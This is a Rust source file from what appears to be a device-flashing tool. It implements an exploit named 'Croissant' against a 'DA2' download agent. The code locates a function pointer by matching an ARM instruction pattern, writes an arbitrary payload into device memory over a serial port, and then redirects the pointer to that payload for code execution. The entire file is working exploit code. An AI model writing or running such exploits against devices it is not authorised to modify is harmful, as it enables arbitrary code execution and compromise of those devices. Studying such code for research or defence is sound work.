use crate::{
    commands::da::Write32,
    exploit::{Exploit, croissant_find_ptr},
};
use derive_ctor::ctor;

/// DA2 function pointer overwrite
#[derive(ctor)]
pub struct Croissant<'a> {
    bytes: &'a [u8],
    payload: &'a [u8],
    payload_address: u32,
}

impl Exploit for Croissant<'_> {
    fn run(&self, port: &mut simpleport::Port) -> crate::Result<()> {
        let (base, offset) = croissant_find_ptr(
            "ldr r?, [r?, #?];\
             blx r?;\
             bl #?;\
             b #?",
            self.bytes,
            4,
        )?;
        println!("Croissant: function pointer: 0x{:x}", base + offset);

        for i in 0..self.payload.len() / 4 {
            Write32::new(
                self.payload_address + (i as u32 * 4),
                u32::from_le_bytes(self.payload[i * 4..(i + 1) * 4].try_into()?),
            )
            .run(port)?;
        }

        Write32::new(base + offset, self.payload_address).run(port)
    }
}
